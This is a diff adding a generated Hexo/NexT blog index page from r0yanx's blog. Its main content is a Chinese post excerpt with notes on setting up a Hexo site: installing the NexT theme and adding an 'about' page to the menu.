+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ryaninf.github.io/2019/07/08/hexo-blog/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="r0yanx">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="r0yanx's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2019/07/08/hexo-blog/" class="post-title-link" itemprop="url">hexo建站笔记</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-07-08 09:55:59" itemprop="dateCreated datePublished" datetime="2019-07-08T09:55:59+08:00">2019-07-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-08-19 17:50:32" itemprop="dateModified" datetime="2020-08-19T17:50:32+08:00">2020-08-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%85%B6%E5%AE%83/" itemprop="url" rel="index"><span itemprop="name">其它</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>因一次意外，hexo博客源码被删除干净，抽空重新配置hexo并重新写了之前的文章。</p>
+<h3 id="安装next主题"><a href="#安装next主题" class="headerlink" title="安装next主题"></a>安装next主题</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> hexo</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="创建-“关于我”-页面"><a href="#创建-“关于我”-页面" class="headerlink" title="创建 “关于我” 页面"></a>创建 “关于我” 页面</h3><p>新建一个 about 页面：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page &quot;about&quot;</span><br></pre></td></tr></table></figure>
+<p>菜单显示 about 链接，在主题的 _configy.yml 设置中将 menu 中 about 前面的注释去掉即可。</p>
+<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">/about</span></span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/07/08/hexo-blog/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+  </nav>
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="r0yanx"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">r0yanx</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ryanInf" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ryanInf" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:ryaninf@outlook.com" title="E-Mail → mailto:ryaninf@outlook.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.freebuf.com/author/r0yanx" title="FreeBuf → https:&#x2F;&#x2F;www.freebuf.com&#x2F;author&#x2F;r0yanx" rel="noopener" target="_blank"><i class="fab fa-fw"></i>FreeBuf</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">r0yanx</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/three-waves.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+    <script defer src="/lib/three/canvas_sphere.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+</body>
+</html>
